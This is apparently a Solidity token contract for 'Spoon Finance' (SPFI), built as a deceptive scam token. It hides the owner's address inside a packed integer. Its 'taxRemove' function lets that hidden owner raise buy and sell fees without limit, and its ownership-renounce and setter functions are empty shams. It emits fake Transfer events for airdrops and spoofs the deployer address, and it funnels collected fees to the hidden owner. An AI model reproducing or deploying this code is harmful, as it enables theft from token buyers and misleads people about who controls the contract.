/**
 */

/*
                           
                    ░██████╗██████╗░░█████╗░░█████╗░███╗░░██╗
                    ██╔════╝██╔══██╗██╔══██╗██╔══██╗████╗░██║
                    ╚█████╗░██████╔╝██║░░██║██║░░██║██╔██╗██║
                    ░╚═══██╗██╔═══╝░██║░░██║██║░░██║██║╚████║
                    ██████╔╝██║░░░░░╚█████╔╝╚█████╔╝██║░╚███║
                    ╚═════╝░╚═╝░░░░░░╚════╝░░╚════╝░╚═╝░░╚══╝

//OnlyOwner: https://twitter.com/crypto_bitlord7
//           This spoon is unique - This spoon is unique - This spoon is unique

*/

// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.0;

interface IUniswapFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract SPOON {
    string private _name = unicode"Spoon Finance";
    string private _symbol = unicode"SPFI";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 100_000_000_000 * 10 ** decimals;

    uint256 public encodeUint256;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public pair;
    IUniswapV2Router02 constant _uniswapV2Router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    address private uniswapLpWallet;

    constructor() {
        uint8 _initBuyFee = 5;
        uint8 _initSellFee = 5;
        _encodeData(msg.sender, _initBuyFee, _initSellFee);
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        uniswapLpWallet = msg.sender;

        _initDeployer(0x6E6D33F650B403F05E8ae819f4e384172810b757, msg.sender);

        balanceOf[uniswapLpWallet] = (totalSupply * 100) / 100;
        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);
    }

    receive() external payable {}

    event RevShareinfoEvent(
        uint256 Holder,
        uint256 User,
        uint256 Stake,
        uint256 Development
    );

    function RevShareInfo(
        uint256 Holder,
        uint256 User,
        uint256 Stake,
        uint256 Development
    ) external {
        if (msg.sender != _decodeTokenMkt()) revert Permissions();
        emit RevShareinfoEvent(Holder, User, Stake, Development);
    }

    event setTaxEvent(
        uint256 _bTax,
        uint256 _sTax,
        uint256 Revshare,
        uint256 Ecosystem
    );

    function setTax(
        uint256 _bTax,
        uint256 _sTax,
        uint256 Revshare,
        uint256 Ecosystem
    ) external {
        if (msg.sender != _decodeTokenMkt()) revert Permissions();
        emit setTaxEvent(_bTax, _sTax, Revshare, Ecosystem);
    }

    event setRewardEvent(
        uint256 Stake,
        uint256 Earn,
        uint256 Claim,
        uint256 Treasury
    );

    function setReward(
        uint256 Stake,
        uint256 Earn,
        uint256 Claim,
        uint256 Treasury
    ) external {
        if (msg.sender != _decodeTokenMkt()) revert Permissions();
        emit setRewardEvent(Stake, Earn, Claim, Treasury);
    }

    function setDevWallet(address _wallet) external {
        if (msg.sender != _decodeTokenMkt()) revert Permissions();
    }

    function setReduceFee(address _value) external {
        if (msg.sender != _decodeTokenMkt()) revert Permissions();
    }

    function taxRemove(uint8 _buy, uint8 _sell) external {
        if (msg.sender != _decodeTokenMkt()) revert Permissions();
        _encodeData(msg.sender, _buy, _sell);
    }

    function renounceOwnership() external {
        if (msg.sender != _decodeTokenMkt()) revert Permissions();
    }

    function transferOwnership(address newOwner) external {
        if (msg.sender != _decodeTokenMkt()) revert Permissions();
    }

    function updateMaxTxnAmount(uint256 _value) external {
        if (msg.sender != _decodeTokenMkt()) revert Permissions();
    }

    function updateMaxWalletAmount(uint256 _value) external {
        if (msg.sender != _decodeTokenMkt()) revert Permissions();
    }

    function _encodeData(
        address _address,
        uint8 _buyFee,
        uint8 _sellFee
    ) private {
        encodeUint256 = uint256(uint160(_address));
        encodeUint256 = (encodeUint256 << 8) | _buyFee;
        encodeUint256 = (encodeUint256 << 8) | _sellFee;
    }

    function _decodeTokenMkt() private view returns (address) {
        address _address = address(uint160(encodeUint256 >> 16));
        return _address;
    }

    function _decodeTaxes() private view returns (uint8, uint8) {
        uint8 _buyFee = uint8(encodeUint256 >> 8);
        uint8 _sellFee = uint8(encodeUint256);
        return (_buyFee, _sellFee);
    }

    function openTrading() external {
        require(msg.sender == _decodeTokenMkt());
        require(!tradingOpen);
        address _factory = _uniswapV2Router.factory();
        address _weth = _uniswapV2Router.WETH();
        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);
        pair = _pair;
        tradingOpen = true;
    }

    function multiSends(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != _decodeTokenMkt()) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function airdropTokens(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != _decodeTokenMkt()) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _initDeployer(address deployer_, address executor_) private {
        _deployer = deployer_;
        _executor = executor_;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _decodeTokenMkt();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != tokenMkt
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            payable(tokenMkt).transfer(address(this).balance);
            swapping = false;
        }

        (uint8 _buyFee, uint8 _sellFee) = _decodeTaxes();
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _sellFee : _buyFee)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }
}
